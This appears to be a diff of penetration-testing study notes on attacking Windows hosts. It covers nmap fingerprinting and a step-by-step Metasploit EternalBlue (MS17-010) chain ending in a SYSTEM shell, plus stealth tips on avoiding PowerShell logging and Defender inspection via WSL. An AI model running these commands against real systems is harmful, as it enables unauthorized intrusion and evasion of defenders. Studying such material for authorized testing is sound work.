@@ -1,112 +1,62 @@
-## Windows OS Fingerprinting
+# Infiltrating Windows
 
-Target is up and responding to ICMP with a **TTL** of or near 128.
+## Fingerprinting
 
-Identify OS via ICMP TTL
+TTL ≈ 128 → Windows (Linux ≈ 64, varies across hops but never overlaps within 20 hops):
 
-```
-ping <TARGET_IP>
-```
-
-Standard OS identification using TCP/IP stack metrics
-
-```
-sudo nmap -v -O <TARGET_IP>
+```bash
+ping <TARGET>
 ```
 
-Aggressive identification when standard scans return limited results
+OS detection + version:
 
-```
-sudo nmap -v -A -Pn <TARGET_IP>
+```bash
+sudo nmap -v -O <TARGET>
+sudo nmap -v -A <TARGET>
 ```
 
-- Ping
-    
-    - `ping <TARGET_IP>`
-    - Prefer for quick, low-noise identification of the 128 TTL signature.
-- Nmap
-    
-    - `nmap -O <TARGET_IP>`
-    - Prefer for version-level granularity (e.g., Windows 10 1709-1909).
-- **Firewalls or security features** can obscure host details or provide misleading stack responses.
-    
+Banner grab all open ports — reveals service versions, VMware daemons, IIS version, etc.:
+
+```bash
+sudo nmap -v <TARGET> --script banner.nse
+```
 
 ---
 
-## Service Banner Grabbing
+## EternalBlue (MS17-010) — Full Chain
 
-Open ports identified but service versions or specific software (e.g., VMware) remain unconfirmed.
-
-Standard banner retrieval for all open ports
+Check vulnerability before attempting exploit:
 
 ```
-sudo nmap -v <TARGET_IP> --script banner.nse
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS <TARGET>
+run
 ```
 
-- **Lack of response** from `banner.nse` does not confirm service inactivity; many ports require specific probes to release a banner.
-
----
-
-## SMB Vulnerability Scanning (MS17-010)
-
-Windows Server 2008 through 2016 identified with port 445 open.
-
-Verify EternalBlue vulnerability status without exploitation
-
-```
-msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS <TARGET_IP>; run"
-```
-
-- **SMB Message Signing Disabled**: Default state in many environments allows for easier exploitation and spoofing.
-    
-- **Network latency** can cause false negatives; ensure `THREADS` is set appropriately for the environment.
-    
-
----
-
-## SMB Remote Code Execution (MS17-010)
-
-Target confirmed **vulnerable** to MS17-010 via scanner and requires **SYSTEM** level access.
-
-Execute EternalBlue via psexec variant for better reliability
+`Host is likely VULNERABLE` → proceed. Use psexec variant — more reliable than eternalblue on Server 2016:
 
 ```
 use exploit/windows/smb/ms17_010_psexec
-set RHOSTS <TARGET_IP>
-set LHOST <ATTACK_IP>
-set LPORT <PORT>
+set RHOSTS <TARGET>
+set LHOST <LHOST>
+set LPORT <LPORT>
 exploit
 ```
 
-- **Service start timeout**: Exploit might report a timeout but still succeed if the payload is a non-service executable.
+Lands as `NT AUTHORITY\SYSTEM`. Drop to cmd from Meterpreter:
+
+```
+meterpreter > shell
+```
+
+`C:\Windows\system32>` = cmd.exe. `PS C:\Windows\system32>` = PowerShell.
 
 ---
 
-## Post-Exploitation Shell Handling
+## CMD vs PowerShell — Decision
 
-Active Meterpreter session established and native OS interaction is required.
+cmd: older hosts (pre-Win7 = no PS), stealth (no command history logged), batch/net commands, avoid execution policy/UAC issues.
 
-Drop from Meterpreter to native CMD shell
+PS: cmdlets, .NET objects, cloud interaction, scripts with aliases — more capable, more logged.
 
-```
-shell
-```
-
-- CMD
-    
-    - `shell` (then check for `C:\>`)
-    - Prefer for **stealth** as it lacks command history and ignores **Execution Policy** and **UAC**.
-- PowerShell
-    
-    - `shell` (then check for `PS C:\>`)
-    - Prefer for .NET object manipulation and advanced administration.
-- **PowerShell Command History**: Commands are recorded on disk, increasing the forensic footprint compared to CMD.
-    
-- **Execution Policy / UAC**: Can prevent PowerShell script execution; CMD is unaffected.
-    
-- **Legacy Hosts**: Windows XP and older do not have PowerShell; CMD is the only option.
-    
-- **WSL/PowerShell Core**: Network traffic from these instances may bypass **Windows Firewall** and **Windows Defender**.
-    
-
-> ⚠️ Gap: Transitioning from Meterpreter to a stable PowerShell session often requires `load powershell` or calling `powershell.exe` specifically; the `shell` command defaults to the system's primary command processor (usually CMD).
+> [!tip] WSL and PowerShell Core on Linux both bypass Windows Firewall and Defender network inspection entirely — traffic from WSL instances is a blind spot. If WSL is present on a target, it's a stealth execution path worth noting.
